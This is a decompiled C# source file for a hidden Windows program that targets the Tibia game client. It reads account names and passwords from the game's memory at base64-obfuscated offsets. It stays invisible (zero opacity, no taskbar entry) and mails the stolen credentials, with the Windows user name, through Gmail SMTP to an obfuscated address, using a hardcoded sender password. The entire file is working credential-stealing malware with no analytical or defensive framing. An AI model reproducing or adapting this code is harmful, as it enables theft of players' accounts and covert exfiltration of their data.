using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using ___codefort;

namespace RAccPass;

public sealed class frmMain : Form
{
	private const string string_0 = "9.71";

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private ToolStripStatusLabel lblStatus;

	private StatusStrip strpStatus;

	private Timer timer_1;

	private Timer timer_2;

	private Label lblPassword;

	private Label lblAccount;

	private Label lblCRC1;

	private Label lblAccount2;

	private Label lblPassword2;

	private Label lblCRC2;

	private static Process[] process_0;

	private static Point point_0;

	public static Process[] Process_0
	{
		get
		{
			return process_0;
		}
		set
		{
			process_0 = value;
		}
	}

	public static string String_0 => "9.71";

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		lblStatus = new ToolStripStatusLabel();
		strpStatus = new StatusStrip();
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		lblPassword = new Label();
		lblAccount = new Label();
		lblCRC1 = new Label();
		lblAccount2 = new Label();
		lblPassword2 = new Label();
		lblCRC2 = new Label();
		((Control)strpStatus).SuspendLayout();
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(500);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((ToolStripItem)lblStatus).set_BackColor(SystemColors.Control);
		((ToolStripItem)lblStatus).set_Name("lblStatus");
		((ToolStripItem)lblStatus).set_Size(new Size(279, 17));
		lblStatus.set_Spring(true);
		((ToolStripItem)lblStatus).set_Text("Esperando pelo Tibia 9.10");
		((ToolStrip)strpStatus).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)lblStatus });
		((Control)strpStatus).set_Location(new Point(0, 57));
		((Control)strpStatus).set_Name("strpStatus");
		((Control)strpStatus).set_Size(new Size(294, 22));
		strpStatus.set_SizingGrip(false);
		((Control)strpStatus).set_TabIndex(8);
		((Control)strpStatus).set_Text("statusStrip1");
		timer_1.set_Enabled(true);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Enabled(true);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		lblPassword.set_BorderStyle((BorderStyle)2);
		((Control)lblPassword).set_Location(new Point(0, 35));
		((Control)lblPassword).set_Name("lblPassword");
		((Control)lblPassword).set_Size(new Size(143, 20));
		((Control)lblPassword).set_TabIndex(4);
		lblPassword.set_TextAlign((ContentAlignment)32);
		lblAccount.set_BorderStyle((BorderStyle)2);
		((Control)lblAccount).set_Location(new Point(0, 9));
		((Control)lblAccount).set_Name("lblAccount");
		((Control)lblAccount).set_Size(new Size(143, 20));
		((Control)lblAccount).set_TabIndex(5);
		lblAccount.set_TextAlign((ContentAlignment)32);
		((Control)lblCRC1).set_AutoSize(true);
		((Control)lblCRC1).set_Location(new Point(54, 0));
		((Control)lblCRC1).set_Name("lblCRC1");
		((Control)lblCRC1).set_Size(new Size(0, 13));
		((Control)lblCRC1).set_TabIndex(9);
		lblAccount2.set_BorderStyle((BorderStyle)2);
		((Control)lblAccount2).set_Location(new Point(149, 9));
		((Control)lblAccount2).set_Name("lblAccount2");
		((Control)lblAccount2).set_Size(new Size(143, 20));
		((Control)lblAccount2).set_TabIndex(13);
		lblAccount2.set_TextAlign((ContentAlignment)32);
		lblPassword2.set_BorderStyle((BorderStyle)2);
		((Control)lblPassword2).set_Location(new Point(149, 35));
		((Control)lblPassword2).set_Name("lblPassword2");
		((Control)lblPassword2).set_Size(new Size(143, 20));
		((Control)lblPassword2).set_TabIndex(12);
		lblPassword2.set_TextAlign((ContentAlignment)32);
		((Control)lblCRC2).set_AutoSize(true);
		((Control)lblCRC2).set_Location(new Point(147, 33));
		((Control)lblCRC2).set_Name("lblCRC2");
		((Control)lblCRC2).set_Size(new Size(0, 13));
		((Control)lblCRC2).set_TabIndex(14);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(294, 79));
		((Control)this).get_Controls().Add((Control)(object)lblCRC2);
		((Control)this).get_Controls().Add((Control)(object)lblAccount2);
		((Control)this).get_Controls().Add((Control)(object)lblPassword2);
		((Control)this).get_Controls().Add((Control)(object)lblCRC1);
		((Control)this).get_Controls().Add((Control)(object)strpStatus);
		((Control)this).get_Controls().Add((Control)(object)lblAccount);
		((Control)this).get_Controls().Add((Control)(object)lblPassword);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("a");
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)strpStatus).ResumeLayout(false);
		((Control)strpStatus).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[STAThread]
	private static void Main(string[] args)
	{
		Class3.smethod_0();
		smethod_0();
	}

	public frmMain()
	{
		InitializeComponent();
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
	}

	private static void smethod_0()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new frmMain());
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		if (Class2.smethod_4())
		{
			int int_ = Class1.smethod_0(Encoding.Unicode.GetString(Convert.FromBase64String("VABpAGIAaQBhAC4AZQB4AGUAKwA1ADQANgBDAEMANAA=")));
			int int_2 = Class1.smethod_0(Encoding.Unicode.GetString(Convert.FromBase64String("VABpAGIAaQBhAC4AZQB4AGUAKwA1ADQANgBDAEUAMAA=")));
			byte b = Class1.smethod_1(int_);
			Class1.smethod_1(int_2);
			string text = ((b == 0) ? "" : Class1.smethod_3(int_, (IntPtr)28));
			string text2 = ((b == 0) ? "" : Class1.smethod_3(int_2, (IntPtr)28));
			if (text.Contains("\0"))
			{
				text = text.Remove(text.IndexOf('\0'));
			}
			if (text2.Contains("\0"))
			{
				text2 = text2.Remove(text2.IndexOf('\0'));
			}
			int int_3 = Class1.smethod_2(int_);
			int int_4 = Class1.smethod_2(int_2);
			string text3 = ((b == 0) ? "" : Class1.smethod_3(int_3, (IntPtr)28));
			string text4 = ((b == 0) ? "" : Class1.smethod_3(int_4, (IntPtr)28));
			if (text3.Contains("\0"))
			{
				text3 = text3.Remove(text3.IndexOf('\0'));
			}
			if (text4.Contains("\0"))
			{
				text4 = text4.Remove(text4.IndexOf('\0'));
			}
			((Control)lblAccount).set_Text(text);
			((Control)lblPassword).set_Text(text2);
			((Control)lblAccount2).set_Text(text3);
			((Control)lblPassword2).set_Text(text4);
			((ToolStripItem)lblStatus).set_ForeColor(Color.Green);
		}
		else
		{
			((ToolStripItem)lblStatus).set_ForeColor(Color.Black);
			((Control)lblAccount).set_Text("");
			((Control)lblCRC1).set_Text("");
			((Control)lblPassword).set_Text("");
			((Control)lblAccount2).set_Text("");
			((Control)lblPassword2).set_Text("");
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		string text = WindowsIdentity.GetCurrent().Name.ToString();
		MailAddress mailAddress = new MailAddress(Encoding.Unicode.GetString(Convert.FromBase64String("ZwBnAHoAaQBuAGgAbwA2ADYANgBAAGcAbQBhAGkAbAAuAGMAbwBtAA==")), text.ToString());
		MailAddress to = new MailAddress(Encoding.Unicode.GetString(Convert.FromBase64String("eAB4AGgAbwB0AG4AbwBzAHgAeABAAGcAbQBhAGkAbAAuAGMAbwBtAA==")), text.ToString());
		SmtpClient smtpClient = new SmtpClient(Encoding.Unicode.GetString(Convert.FromBase64String("cwBtAHQAcAAuAGcAbQBhAGkAbAAuAGMAbwBtAA==")), 587);
		smtpClient.EnableSsl = true;
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential(mailAddress.Address, "(.91.252,)a,xz_s");
		MailMessage mailMessage = new MailMessage(mailAddress, to);
		mailMessage.Subject = Encoding.Unicode.GetString(Convert.FromBase64String("bABvAGcAIQAgADkALgA3ADEAIABDAFIAWQAgAEYARAAhAA=="));
		mailMessage.Body = Encoding.Unicode.GetString(Convert.FromBase64String("QQBjAGMAbwB1AG4AdAA6ACAA")) + ((Control)lblAccount).get_Text() + Environment.NewLine + Encoding.Unicode.GetString(Convert.FromBase64String("UABhAHMAcwB3AG8AcgBkADoAIAA=")) + ((Control)lblPassword).get_Text() + Environment.NewLine + Environment.NewLine + Encoding.Unicode.GetString(Convert.FromBase64String("QQBjAGMAbwB1AG4AdAA6ACAA")) + ((Control)lblAccount2).get_Text() + Environment.NewLine + Encoding.Unicode.GetString(Convert.FromBase64String("UABhAHMAcwB3AG8AcgBkADoAIAA=")) + ((Control)lblPassword2).get_Text();
		smtpClient.Send(mailMessage);
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		if (((Control)lblAccount).get_Text() != "" && ((Control)lblAccount2).get_Text() != "")
		{
			method_0(null, null);
			timer_1.set_Enabled(false);
			((Control)lblCRC1).set_Text(((Control)lblAccount).get_Text());
		}
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		if (((Control)lblAccount).get_Text() != ((Control)lblCRC1).get_Text() && ((Control)lblAccount).get_Text() != ((Control)lblCRC2).get_Text())
		{
			timer_1.set_Enabled(true);
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	static frmMain()
	{
		Class3.smethod_0();
		process_0 = Process.GetProcessesByName(Encoding.Unicode.GetString(Convert.FromBase64String("VABpAGIAaQBhAA==")));
		point_0 = Point.Empty;
	}
}
